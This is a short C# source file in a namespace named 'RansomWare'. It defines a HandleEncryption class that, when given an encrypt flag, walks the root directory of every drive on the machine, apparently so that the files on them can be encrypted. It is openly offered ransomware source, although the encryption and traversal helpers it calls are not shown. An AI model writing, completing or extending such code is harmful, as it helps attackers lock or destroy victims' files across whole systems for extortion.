namespace RansomWare;

public class HandleEncryption
{
    public HandleEncryption(Encryption encryption)
    {
        if (encryption == Encryption.ENCRYPT)
        {
            encryptFiles();
        }
    }

    private void encryptFiles()
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            Util.TraverseDirectory(drive.RootDirectory);
        }
        
    }
}